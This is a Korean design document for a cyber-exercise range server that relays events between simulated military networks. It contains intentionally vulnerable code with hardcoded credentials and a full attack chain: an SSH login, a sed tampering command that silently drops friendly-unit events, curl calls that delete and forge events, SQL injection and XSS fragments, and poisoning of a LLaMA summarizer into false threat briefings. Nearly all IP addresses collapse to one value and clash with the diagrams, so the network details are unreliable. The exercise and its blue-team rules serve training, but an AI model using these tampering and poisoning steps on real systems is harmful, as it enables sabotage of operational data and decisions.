# 자산 설계서 #C12 — 망 연동 서버

| 항목 | 내용 |
|------|------|
| 자산 ID | C12 |
| IP | 192.168.92.232 |
| OS | Ubuntu 22.04 LTS |
| 도메인 | relay.c4i.local |
| 역할 | INT↔C4I 데이터 브릿지 (동기화 스크립트) |
| 작성일 | 2026-03-26 |

---

## 1. 개요

### 1.1 자산 목적

C12 망 연동 서버는 군 INT 존(192.168.92.0/24)과 C4I 존(192.168.92.0/24)을 연결하는 데이터 브릿지이다. 군 INT 존의 내부 업무 포털(I6, 192.168.92.232)에서 수집된 작전 이벤트를 주기적으로 가져와 C4I 존의 데이터 수집 서버(C14, 192.168.92.232)로 전달한다.

주요 기능:
- **이벤트 동기화**: INT 존 이벤트 소스에서 신규 이벤트 주기적 수집
- **데이터 변환**: INT 포맷 → C4I 표준 포맷으로 변환
- **전달**: 변환된 이벤트를 C14 데이터 수집 API로 전송
- **로그 관리**: 동기화 이력 로컬 로그 기록

### 1.2 훈련에서의 역할

이 자산은 STEP 5-1의 **첫 번째 공격 대상**이다. 공격자는 군 INT 존에서 탈취한 SSH 크리덴셜로 망 연동 서버에 접근하여, 동기화 스크립트(`sync_events.py`)를 변조한다. 변조된 스크립트는 아군 이동(`friendly_move`) 이벤트를 의도적으로 필터링하여 C4I 존에 전달하지 않음으로써, 이후 모든 작전 데이터에서 아군 정보가 누락되는 결과를 초래한다.

### 1.3 핵심 공격 벡터 요약

| 취약점 | 유형 | 공격 효과 |
|--------|------|-----------|
| VULN-1: SSH 하드코딩 크리덴셜 | 인증 정보 노출 | relay-admin / R3lay!Sync#2024로 원격 접속 |
| VULN-2: 스크립트 root 실행 | 권한 과다 부여 | systemd 서비스가 root로 동작, 시스템 전체 접근 가능 |
| VULN-3: 무결성 검증 부재 | 파일 변조 미탐지 | 스크립트 파일 해시 검증 없음, 변조 후에도 정상 동작 |
| VULN-4: 감사 로그 미흡 | 로그인 모니터링 부재 | SSH 로그인/스크립트 변경 실시간 알림 없음 |

### 1.4 공격 체인 위치 (PHASE 5)

```
[STEP 4-5 완료] 군 INT 존 장악
    │
    │  Havoc C2 Demon → 관리자 PC (192.168.92.254) 장악
    │  AD 도메인 관리자 권한 획득
    │  SSH 키 / 크리덴셜 탈취 (relay-admin / R3lay!Sync#2024)
    │
    ▼
[OPNSense-7 (192.168.92.1 ↔ 192.168.92.232)]
    │
    │  허용 규칙: 192.168.92.254 → 192.168.92.232:22 (SSH)
    │             192.168.92.232~12 → 192.168.92.232:8000 (API)
    │             192.168.92.0/24 내부 전체 허용
    │
    ▼
[STEP 5-1] C12 망 연동 서버 (192.168.92.232) — 동기화 스크립트 변조
    │
    │  ① SSH 로그인 (relay-admin / R3lay!Sync#2024)
    │  ② /opt/relay/scripts/sync_events.py 변조
    │  ③ friendly_move 이벤트 필터링 (아군 이동 정보 차단)
    │
    ▼
[STEP 5-2] C14 데이터 수집 서버 (192.168.92.232) — 핵심 데이터 변조
    │
    │  ① /api/config → API 키 노출 (dev-key-12345)
    │  ② DELETE /api/events?type=friendly_move → 기존 아군 이벤트 전량 삭제
    │  ③ POST /api/events × 50회 → 허위 enemy_advance 이벤트 대량 주입
    │  ④ 실제 이벤트 수정 (PUT /api/events/{id}) → 좌표 왜곡
    │
    ▼
[STEP 5-3] C13 작전 상황도 서버 (192.168.92.232) — COP 지도 직접 변조
    │
    │  ① JSP SQL Injection: getUnit.jsp?id=1' UNION SELECT ...
    │  ② map_objects 테이블 직접 조작 → 허위 적군 마커 삽입
    │  ③ Stored XSS: updateUnit.jsp label 필드에 악성 스크립트
    │
    ▼
[STEP 5 결과] C15 AI 서버 (192.168.92.232) — 간접 오염
    │
    │  ① C14에서 변조된 데이터 자동 수집 (15분 주기)
    │  ② LLaMA가 허위 데이터 기반으로 상황 요약 생성
    │  ③ "적 대규모 전진 감지, 즉각 대응 권고" 허위 브리핑 출력
    │
    ▼
[최종 효과] C16 작전용 PC ((테스트 미할당)~25)
    │
    │  작전 요원이 COP 지도에서 허위 적군 위치 확인
    │  AI 브리핑에서 허위 위협 보고 수신
    │  지휘관이 잘못된 정보에 기반한 의사결정 수행
    │
    ▼
★ 작전 목표 달성: 군 의사결정 무력화 ★
```

### 1.5 환경변수

```bash
# C4I 존 공통 환경변수
C4I_SUBNET=192.168.92.0/24
C4I_GW=192.168.92.232
C4I_API_URL=http://192.168.92.232:8000
C4I_API_KEY=dev-key-12345
COP_URL=http://192.168.92.232:8080
SUMMARY_AI_URL=http://192.168.92.232:8001
SUMMARY_OLLAMA_URL=http://192.168.92.232:11434
RELAY_SERVER=192.168.92.232
INT_EVENT_SOURCE=http://192.168.92.232:8080/api/events
```

---

## 2. 기술 스택

| 계층 | 기술 | 버전 | 용도 |
|------|------|------|------|
| OS | Ubuntu | 22.04 LTS | 기반 운영체제 |
| Runtime | Python | 3.11 | 동기화 스크립트 실행 |
| HTTP 클라이언트 | requests | 2.31.x | HTTP API 호출 |
| SSH 라이브러리 | paramiko | 3.4.x | INT 존 원격 접근 (미사용, 잔여 코드) |
| JSON | json (builtin) | - | 이벤트 데이터 직렬화 |
| 로깅 | logging (builtin) | - | 동기화 로그 기록 |
| 스케줄링 | systemd timer | - | 30초 주기 실행 |

### 의존성 파일

```
# /opt/relay/requirements.txt
requests==2.31.0
paramiko==3.4.0
python-dotenv==1.0.0
```

---

## 3. 컴포넌트 아키텍처

```
┌────────────────────────────────────────────────────────────────────────┐
│                C12 망 연동 서버 (192.168.92.232)                        │
│                Ubuntu 22.04 / relay.c4i.local                          │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │              systemd timer: relay-sync.timer                     │  │
│  │              주기: 30초 (OnUnitActiveSec=30s)                     │  │
│  │              실행 단위: relay-sync.service                        │  │
│  └───────────────────────────┬──────────────────────────────────────┘  │
│                              │ 트리거                                   │
│                              ▼                                          │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │         /opt/relay/scripts/sync_events.py                        │  │
│  │         (★ 공격 대상 스크립트 — VULN-3)                           │  │
│  │                                                                  │  │
│  │  1. INT 이벤트 소스에서 신규 이벤트 조회                          │  │
│  │     GET http://192.168.92.232:8080/api/events?since={last_sync}  │  │
│  │                                                                  │  │
│  │  2. 이벤트 변환 (INT 포맷 → C4I 포맷)                            │  │
│  │     - timestamp 표준화                                           │  │
│  │     - location 좌표 검증                                         │  │
│  │     - source = "relay" 태그 추가                                 │  │
│  │                                                                  │  │
│  │  3. C14 데이터 수집 API로 전달                                   │  │
│  │     POST http://192.168.92.232:8000/api/events                   │  │
│  │     Header: X-API-Key: dev-key-12345                             │  │
│  │                                                                  │  │
│  │  4. 마지막 동기화 시각 기록                                      │  │
│  │     /opt/relay/data/last_sync.txt                                │  │
│  └──────────────────────────────────────────────────────────────────┘  │
│                                                                        │
│  ┌──────────────────────────────────────────────────────────────────┐  │
│  │              로그 및 데이터                                       │  │
│  │  /opt/relay/logs/sync.log        — 동기화 이력                   │  │
│  │  /opt/relay/data/last_sync.txt   — 마지막 동기화 타임스탬프       │  │
│  │  /opt/relay/config/relay.env     — 설정 파일 (API 키 포함)       │  │
│  └──────────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 4. 소스 코드

### 4.1 sync_events.py (동기화 스크립트 — 공격 대상)

```python
#!/usr/bin/env python3
"""
C4I 망 연동 서버 — 이벤트 동기화 스크립트
INT 존 이벤트 소스에서 신규 작전 이벤트를 수집하여 C4I 데이터 수집 서버로 전달한다.

실행 방식: systemd timer (30초 주기)
실행 권한: root (★ VULN-2: 불필요한 root 권한)

파일 경로: /opt/relay/scripts/sync_events.py
"""

import json
import logging
import os
import sys
from datetime import datetime, timedelta, timezone

import requests

# ============================================================
# 설정 (★ VULN-1: 크리덴셜 및 API 키 하드코딩)
# ============================================================
INT_EVENT_SOURCE = "http://192.168.92.232:8080/api/events"
C4I_DATA_API = "http://192.168.92.232:8000/api/events"
C4I_API_KEY = "dev-key-12345"  # ★ 하드코딩된 API 키

# SSH 크리덴셜 (원격 점검용으로 남겨진 잔여 코드 ★ VULN-1)
SSH_USER = "relay-admin"
SSH_PASS = "R3lay!Sync#2024"
SSH_HOST = "192.168.92.232"

LAST_SYNC_FILE = "/opt/relay/data/last_sync.txt"
LOG_FILE = "/opt/relay/logs/sync.log"

# ============================================================
# 로깅 설정
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("relay-sync")


def get_last_sync_time():
    """마지막 동기화 시각을 파일에서 읽어온다."""
    try:
        with open(LAST_SYNC_FILE, "r") as f:
            ts = f.read().strip()
            return ts
    except FileNotFoundError:
        # 파일이 없으면 24시간 전부터 수집
        default = (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat()
        logger.info(f"last_sync 파일 없음, 기본값 사용: {default}")
        return default


def save_last_sync_time(ts):
    """마지막 동기화 시각을 파일에 기록한다."""
    os.makedirs(os.path.dirname(LAST_SYNC_FILE), exist_ok=True)
    with open(LAST_SYNC_FILE, "w") as f:
        f.write(ts)


def fetch_events_from_int(since):
    """
    INT 존 이벤트 소스에서 신규 이벤트를 조회한다.

    Args:
        since: ISO 8601 형식 타임스탬프 (이 시각 이후 이벤트만 조회)

    Returns:
        list: 이벤트 목록
    """
    try:
        resp = requests.get(
            INT_EVENT_SOURCE,
            params={"since": since, "limit": 500},
            timeout=30,
        )
        resp.raise_for_status()
        events = resp.json()
        logger.info(f"INT에서 {len(events)}건 이벤트 수신")
        return events
    except requests.RequestException as e:
        logger.error(f"INT 이벤트 조회 실패: {e}")
        return []


def transform_event(raw_event):
    """
    INT 포맷 이벤트를 C4I 표준 포맷으로 변환한다.

    INT 포맷:
        {
            "event_id": "EVT-001",
            "event_type": "friendly_move",
            "unit_name": "제1보병대대",
            "lat": 37.5665, "lng": 126.978,
            "event_time": "2026-03-26T10:00:00Z",
            "priority_level": "medium"
        }

    C4I 포맷:
        {
            "type": "friendly_move",
            "unit": "제1보병대대",
            "location": {"lat": 37.5665, "lng": 126.978},
            "timestamp": "2026-03-26T10:00:00Z",
            "priority": "medium",
            "source": "relay",
            "verified": false
        }
    """
    try:
        c4i_event = {
            "type": raw_event.get("event_type", "unknown"),
            "unit": raw_event.get("unit_name", "불명"),
            "location": {
                "lat": float(raw_event.get("lat", 0)),
                "lng": float(raw_event.get("lng", 0)),
            },
            "timestamp": raw_event.get("event_time", datetime.now(timezone.utc).isoformat()),
            "priority": raw_event.get("priority_level", "low"),
            "source": "relay",
            "verified": False,
        }
        return c4i_event
    except (ValueError, TypeError) as e:
        logger.warning(f"이벤트 변환 실패: {e}, 원본: {raw_event}")
        return None


def send_to_data_collector(events):
    """
    변환된 이벤트를 C14 데이터 수집 API로 전송한다.

    Args:
        events: C4I 포맷 이벤트 목록

    Returns:
        int: 성공적으로 전송된 이벤트 수
    """
    success_count = 0
    for event in events:
        try:
            resp = requests.post(
                C4I_DATA_API,
                json=event,
                headers={
                    "X-API-Key": C4I_API_KEY,
                    "Content-Type": "application/json",
                },
                timeout=10,
            )
            if resp.status_code in (200, 201):
                success_count += 1
            else:
                logger.warning(
                    f"이벤트 전송 실패 (HTTP {resp.status_code}): {resp.text}"
                )
        except requests.RequestException as e:
            logger.error(f"이벤트 전송 오류: {e}")
    return success_count


def main():
    """메인 동기화 루프"""
    logger.info("=" * 60)
    logger.info("C4I 망 연동 동기화 시작")
    logger.info("=" * 60)

    # 1. 마지막 동기화 시각 확인
    last_sync = get_last_sync_time()
    logger.info(f"마지막 동기화: {last_sync}")

    # 2. INT에서 신규 이벤트 조회
    raw_events = fetch_events_from_int(last_sync)
    if not raw_events:
        logger.info("동기화할 신규 이벤트 없음")
        return

    # 3. 이벤트 변환
    transformed = []
    for raw in raw_events:
        event = transform_event(raw)
        if event:
            transformed.append(event)

    logger.info(f"변환 완료: {len(transformed)}/{len(raw_events)}건")

    # 4. C14로 전송
    sent = send_to_data_collector(transformed)
    logger.info(f"전송 완료: {sent}/{len(transformed)}건")

    # 5. 동기화 시각 갱신
    now = datetime.now(timezone.utc).isoformat()
    save_last_sync_time(now)
    logger.info(f"동기화 완료, 다음 동기화 기준: {now}")


if __name__ == "__main__":
    main()
```

### 4.2 변조된 sync_events.py (공격자가 수정한 버전)

공격자가 `sed -i` 또는 직접 편집으로 아래와 같이 변조한다:

```python
# ★★★ 공격자 변조 부분 (transform_event 함수 내부) ★★★
# 원본: 모든 이벤트를 무조건 변환
# 변조: friendly_move 이벤트를 의도적으로 필터링

def transform_event(raw_event):
    """이벤트 변환 (변조됨)"""
    try:
        event_type = raw_event.get("event_type", "unknown")

        # ★★★ 공격자 삽입 코드: 아군 이동 이벤트 필터링 ★★★
        FILTERED_TYPES = ["friendly_move", "friendly_patrol", "friendly_resupply"]
        if event_type in FILTERED_TYPES:
            logger.debug(f"이벤트 스킵 (중복): {event_type}")  # 로그 위장
            return None
        # ★★★ 공격자 삽입 코드 끝 ★★★

        c4i_event = {
            "type": event_type,
            "unit": raw_event.get("unit_name", "불명"),
            "location": {
                "lat": float(raw_event.get("lat", 0)),
                "lng": float(raw_event.get("lng", 0)),
            },
            "timestamp": raw_event.get("event_time", datetime.now(timezone.utc).isoformat()),
            "priority": raw_event.get("priority_level", "low"),
            "source": "relay",
            "verified": False,
        }
        return c4i_event
    except (ValueError, TypeError) as e:
        logger.warning(f"이벤트 변환 실패: {e}")
        return None
```

공격자의 실제 변조 명령:

```bash
# 공격자가 관리자 PC(192.168.92.254)에서 SSH 접속
ssh relay-admin@192.168.92.232
# 비밀번호: R3lay!Sync#2024

# 스크립트 변조 (friendly 이벤트 필터링 코드 삽입)
sed -i '/event_type = raw_event.get/a\\n        # 중복 이벤트 필터링 (최적화)\n        FILTERED_TYPES = ["friendly_move", "friendly_patrol", "friendly_resupply"]\n        if event_type in FILTERED_TYPES:\n            logger.debug(f"이벤트 스킵 (중복): {event_type}")\n            return None' \
    /opt/relay/scripts/sync_events.py

# systemd 서비스 재시작 (변조 즉시 적용)
sudo systemctl restart relay-sync.timer
```

---

## 5. systemd 서비스 설정

### 5.1 relay-sync.service

```ini
# /etc/systemd/system/relay-sync.service
[Unit]
Description=C4I Relay Event Sync Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
# ★ VULN-2: root로 실행 (불필요한 권한 상승)
User=root
Group=root
WorkingDirectory=/opt/relay
ExecStart=/usr/bin/python3 /opt/relay/scripts/sync_events.py
StandardOutput=journal
StandardError=journal
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
```

### 5.2 relay-sync.timer

```ini
# /etc/systemd/system/relay-sync.timer
[Unit]
Description=C4I Relay Sync Timer (30s interval)

[Timer]
OnBootSec=10s
OnUnitActiveSec=30s
AccuracySec=5s
Unit=relay-sync.service

[Install]
WantedBy=timers.target
```

---

## 6. 취약점 상세

### VULN-1: 하드코딩된 크리덴셜

| 항목 | 내용 |
|------|------|
| 위치 | `/opt/relay/scripts/sync_events.py` 12~14행 |
| 유형 | CWE-798 (Use of Hard-coded Credentials) |
| 크리덴셜 | SSH: `relay-admin` / `R3lay!Sync#2024`, API Key: `dev-key-12345` |
| 영향 | 스크립트 열람 시 SSH 접속 및 C14 API 접근 가능 |
| 공격 시나리오 | INT 존에서 크리덴셜 탈취 → C12 SSH 접속 → 스크립트 파일에서 추가 크리덴셜 확보 |

### VULN-2: root 권한 실행

| 항목 | 내용 |
|------|------|
| 위치 | `/etc/systemd/system/relay-sync.service` User=root |
| 유형 | CWE-250 (Execution with Unnecessary Privileges) |
| 영향 | 스크립트 실행 환경이 root이므로 시스템 전체에 대한 읽기/쓰기 가능 |
| 공격 시나리오 | 스크립트 변조 시 임의 시스템 명령 실행 가능 (reverse shell 등) |

### VULN-3: 파일 무결성 검증 부재

| 항목 | 내용 |
|------|------|
| 위치 | systemd 서비스 전체 |
| 유형 | CWE-353 (Missing Support for Integrity Check) |
| 영향 | 스크립트 파일이 변조되어도 탐지 불가, 서비스가 변조된 코드를 그대로 실행 |
| 공격 시나리오 | `sed -i`로 스크립트 변조 → systemd 재시작 → 변조된 코드가 30초마다 실행 |

---

## 7. 탐지 방안 (블루팀)

| 탐지 항목 | 방법 | 도구 |
|-----------|------|------|
| SSH 비정상 로그인 | `/var/log/auth.log` 에서 relay-admin 로그인 모니터링 | auditd, Wazuh |
| 스크립트 파일 변조 | `sha256sum /opt/relay/scripts/sync_events.py` 주기적 해시 검증 | AIDE, Tripwire |
| 아군 이벤트 누락 | C14 수신 이벤트 중 friendly_move 비율 급감 탐지 | 커스텀 모니터링 |
| systemd 서비스 재시작 | `journalctl -u relay-sync.service` 비정상 재시작 기록 | systemd journal |
| 파일 접근 감사 | `/opt/relay/scripts/` 디렉토리 auditd 규칙 | auditd |

```bash
# 블루팀 탐지 규칙 예시
# /etc/audit/rules.d/relay-watch.rules
-w /opt/relay/scripts/sync_events.py -p wa -k relay_script_modify
-w /opt/relay/config/ -p wa -k relay_config_modify
```

---

## 8. 설치 스크립트

```bash
#!/bin/bash
# /opt/relay/setup.sh — C12 망 연동 서버 설치 스크립트

set -e

echo "=========================================="
echo "C12 망 연동 서버 설치 시작"
echo "호스트: relay.c4i.local (192.168.92.232)"
echo "=========================================="

# 1. 시스템 업데이트
apt-get update && apt-get upgrade -y

# 2. Python 및 의존성 설치
apt-get install -y python3 python3-pip python3-venv

# 3. 디렉토리 구조 생성
mkdir -p /opt/relay/{scripts,config,data,logs}

# 4. Python 가상 환경
python3 -m venv /opt/relay/venv
source /opt/relay/venv/bin/activate
pip install requests paramiko python-dotenv

# 5. 스크립트 배포
cat > /opt/relay/scripts/sync_events.py << 'PYSCRIPT'
# ... (위의 sync_events.py 전체 내용)
PYSCRIPT

chmod +x /opt/relay/scripts/sync_events.py

# 6. 환경 설정 파일
cat > /opt/relay/config/relay.env << 'ENVFILE'
INT_EVENT_SOURCE=http://192.168.92.232:8080/api/events
C4I_DATA_API=http://192.168.92.232:8000/api/events
C4I_API_KEY=dev-key-12345
ENVFILE

# 7. systemd 서비스 등록
cat > /etc/systemd/system/relay-sync.service << 'SVCFILE'
[Unit]
Description=C4I Relay Event Sync Service
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
User=root
Group=root
WorkingDirectory=/opt/relay
ExecStart=/opt/relay/venv/bin/python /opt/relay/scripts/sync_events.py
StandardOutput=journal
StandardError=journal
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=multi-user.target
SVCFILE

cat > /etc/systemd/system/relay-sync.timer << 'TMRFILE'
[Unit]
Description=C4I Relay Sync Timer (30s interval)

[Timer]
OnBootSec=10s
OnUnitActiveSec=30s
AccuracySec=5s
Unit=relay-sync.service

[Install]
WantedBy=timers.target
TMRFILE

# 8. 사용자 계정 생성 (★ SSH 접속용)
useradd -m -s /bin/bash relay-admin
echo "relay-admin:R3lay!Sync#2024" | chpasswd
usermod -aG sudo relay-admin

# 9. SSH 설정 (비밀번호 인증 허용)
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

# 10. systemd 활성화
systemctl daemon-reload
systemctl enable relay-sync.timer
systemctl start relay-sync.timer

# 11. 호스트명 설정
hostnamectl set-hostname relay-c4i

echo "=========================================="
echo "C12 망 연동 서버 설치 완료"
echo "동기화 타이머: $(systemctl is-active relay-sync.timer)"
echo "=========================================="
```

---

## 9. 공통 참조 정보

### 9.1 OPNSense-7 방화벽 규칙

#### 인터페이스 구성

```
WAN: 192.168.92.1/24 (군 INT 측)
LAN: 192.168.92.232/24 (C4I 측)
관리: 192.168.1.17/24 (OOB 관리)
```

#### 방화벽 규칙

| # | 방향 | 출발지 | 도착지 | 포트 | 프로토콜 | 동작 | 설명 |
|---|------|--------|--------|------|----------|------|------|
| 1 | WAN→LAN | 192.168.92.254 (관리자 PC) | 192.168.92.232 | 22 | TCP | ALLOW | SSH 관리 접근 (★ 공격 경로) |
| 2 | WAN→LAN | 192.168.92.232 (INT 포털) | 192.168.92.232 | 443 | TCP | ALLOW | INT→릴레이 이벤트 소스 |
| 3 | LAN→LAN | 192.168.92.0/24 | 192.168.92.0/24 | * | * | ALLOW | C4I 내부 전체 허용 |
| 4 | LAN→WAN | 192.168.92.232 | 192.168.92.232 | 8080 | TCP | ALLOW | 릴레이→INT 이벤트 수집 |
| 5 | WAN→LAN | * | * | * | * | **DENY** | 기본 거부 (나머지 모두 차단) |
| 6 | LAN→WAN | * | * | * | * | **DENY** | C4I→외부 기본 거부 |

> **핵심 설계**: OPNSense-7은 군 INT에서 C4I로의 인바운드를 극히 제한한다. 오직 관리자 PC(192.168.92.254)에서 릴레이 서버(192.168.92.232)로의 SSH만 허용된다.

### 9.2 DNS 설정 (C4I 내부)

```bash
# C4I 존 내부 호스트 (/etc/hosts)
192.168.92.232   gw.c4i.local
192.168.92.232  relay.c4i.local
192.168.92.232  cop.c4i.local
192.168.92.232  data.c4i.local
192.168.92.232  summary.c4i.local
(테스트 미할당)  ops-pc-1.c4i.local
(테스트 미할당)  ops-pc-2.c4i.local
(테스트 미할당)  ops-pc-3.c4i.local
(테스트 미할당)  ops-pc-4.c4i.local
192.168.92.232  ops-pc-5.c4i.local
```

### 9.3 네트워크 토폴로지

```
                    ┌──────────────────────────────────────────────────┐
                    │              C4I 존 (192.168.92.0/24)            │
                    │                                                    │
    ┌───────────┐   │   ┌──────────┐    ┌──────────┐    ┌──────────┐   │
    │ 군 INT    │───┼──▶│ C12 망연동│───▶│ C14 데이터│◀──▶│ C13 COP  │   │
    │ 이벤트    │   │   │ 서버     │    │ 수집 서버 │    │ 상황도   │   │
    │ 192.168.  │   │   │ .130.10  │    │ .130.12  │    │ .130.11  │   │
    │ 110.10    │   │   └──────────┘    └────┬─────┘    └────┬─────┘   │
    └───────────┘   │                        │               │         │
                    │                        ▼               │         │
        OPNSense-7  │                   ┌──────────┐         │         │
        (방화벽)     │                   │ C15 AI   │         │         │
                    │                   │ 요약 서버 │         │         │
                    │                   │ .130.13  │         │         │
                    │                   └────┬─────┘         │         │
                    │                        │               │         │
                    │                        ▼               ▼         │
                    │              ┌──────────────────────────────┐     │
                    │              │   C16 작전용 PC 1~5          │     │
                    │              │   .130.21 ~ .130.25          │     │
                    │              │   COP 지도 + AI 브리핑 열람   │     │
                    │              └──────────────────────────────┘     │
                    └──────────────────────────────────────────────────┘
```

### 9.4 블루팀 탐지 요약 (C12 관련)

| 자산 | 탐지 항목 | 심각도 | 탐지 방법 |
|------|-----------|--------|-----------|
| C12 | relay-admin SSH 로그인 | HIGH | `/var/log/auth.log` |
| C12 | sync_events.py 파일 변조 | CRITICAL | `sha256sum` 해시 비교, AIDE |
| C12 | friendly 이벤트 전달 중단 | CRITICAL | C14 수신 이벤트 유형 비율 |

### 9.5 크리덴셜 참조

| 자산 | 서비스 | 계정 | 비밀번호 | 용도 |
|------|--------|------|----------|------|
| C12 | SSH | relay-admin | R3lay!Sync#2024 | 서버 관리 (★ 공격 진입점) |
| C12 | Script | (하드코딩) | dev-key-12345 | C14 API 접근 |

### 9.6 네트워크 포트

| 자산 | IP | 포트 | 프로토콜 | 서비스 |
|------|-----|------|----------|--------|
| C12 | 192.168.92.232 | 22 | TCP | SSH (OpenSSH) |

### 9.7 PHASE 5 전체 공격 체인 다이어그램

```
╔═══════════════════════════════════════════════════════════════════════╗
║                    PHASE 5: C4I 작전 데이터 변조                      ║
║                    목표: 군 의사결정 무력화                            ║
║                    시간: D+2 T+44h ~ T+52h                           ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║  [사전 조건] PHASE 4 완료 — 관리자 PC (192.168.92.254) 장악          ║
║             AD 도메인 관리자 권한, SSH 크리덴셜 탈취                   ║
║                                                                       ║
║          ┌─────────────── OPNSense-7 ───────────────┐                ║
║          │  192.168.92.1 ←→ 192.168.92.232        │                ║
║          │  규칙: .110.40 → .130.10:22 SSH (유일)    │                ║
║          └─────────────────────┬─────────────────────┘                ║
║                                │                                      ║
║  ┌─────────────────────────────▼─────────────────────────────────┐   ║
║  │ [STEP 5-1] C12 망 연동 서버 (192.168.92.232)                  │   ║
║  │                                                                │   ║
║  │  $ ssh relay-admin@192.168.92.232                             │   ║
║  │  Password: R3lay!Sync#2024                                    │   ║
║  │                                                                │   ║
║  │  $ sed -i '...' /opt/relay/scripts/sync_events.py             │   ║
║  │  → friendly_move, friendly_patrol, friendly_resupply 필터링   │   ║
║  │  → 이후 동기화에서 아군 이벤트 차단                            │   ║
║  │                                                                │   ║
║  │  $ sudo systemctl restart relay-sync.timer                    │   ║
║  └───────────────────────────┬───────────────────────────────────┘   ║
║                              │ 아군 이벤트 차단됨                     ║
║                              ▼                                        ║
║  ┌───────────────────────────────────────────────────────────────┐   ║
║  │ [STEP 5-2] C14 데이터 수집 서버 (192.168.92.232) ★핵심★      │   ║
║  │                                                                │   ║
║  │  ① curl http://data.c4i.local:8000/api/config                │   ║
║  │     → api_key: "dev-key-12345" 획득                           │   ║
║  │                                                                │   ║
║  │  ② curl -X DELETE .../api/events?type=friendly_move           │   ║
║  │     → 기존 아군 이벤트 전량 삭제 (인증 불필요)                 │   ║
║  │                                                                │   ║
║  │  ③ for i in 1..50; curl -X POST .../api/events               │   ║
║  │     → 허위 enemy_advance 이벤트 50건 주입                     │   ║
║  │                                                                │   ║
║  │  ④ curl -X PUT .../api/events/{id}                            │   ║
║  │     → 기존 적군 이벤트 좌표 → 서울 근교로 왜곡                │   ║
║  └───────────────────┬───────────────────┬───────────────────────┘   ║
║                      │                   │                            ║
║            ┌─────────▼───────┐  ┌────────▼─────────┐                 ║
║            │ [STEP 5-3]      │  │ [자동 전파]       │                 ║
║            │ C13 COP 서버    │  │ C15 AI 서버       │                 ║
║            │ (192.168.92.232)│  │ (192.168.92.232)  │                 ║
║            │                 │  │                   │                 ║
║            │ JSP SQLi:       │  │ 15분 후 자동:     │                 ║
║            │ getUnit.jsp     │  │ 허위 데이터 수집  │                 ║
║            │ → INSERT 적군   │  │ → LLaMA 분석      │                 ║
║            │ → UPDATE 좌표   │  │ → 허위 브리핑     │                 ║
║            │                 │  │   "적 대규모 공세" │                 ║
║            │ Stored XSS:     │  │   "즉각 대응 권고" │                 ║
║            │ updateUnit.jsp  │  │                   │                 ║
║            └────────┬────────┘  └────────┬──────────┘                 ║
║                     │                    │                            ║
║                     └────────┬───────────┘                            ║
║                              │                                        ║
║                              ▼                                        ║
║  ┌───────────────────────────────────────────────────────────────┐   ║
║  │ [최종 결과] C16 작전용 PC ((테스트 미할당)~25)                 │   ║
║  │                                                                │   ║
║  │  작전 요원이 COP 지도에서 확인하는 내용:                       │   ║
║  │  ✗ 아군 부대 위치 → 표시 안 됨 (삭제됨)                      │   ║
║  │  ✗ 적군 부대 → 50개 허위 마커 (전 전방에 걸쳐 표시)           │   ║
║  │  ✗ AI 브리핑 → "적 대규모 전면 공격 임박, 즉각 전투 준비"     │   ║
║  │                                                                │   ║
║  │  ★ 지휘관 잘못된 의사결정 → 불필요한 전투 준비 명령            │   ║
║  │  ★ 아군 위치 불명 → 피아 식별 불가 → 아군 피해 가능성          │   ║
║  │  ★ 실제 위협 대비 불가 → 진짜 적 동향 은폐                    │   ║
║  └───────────────────────────────────────────────────────────────┘   ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
```

---

> **문서 끝** — 이 문서는 사이버 훈련 환경 구축을 위한 기술 설계서이며, 실제 군사 시스템과 무관하다. 모든 IP, 크리덴셜, 도메인은 가상 환경 전용이다.
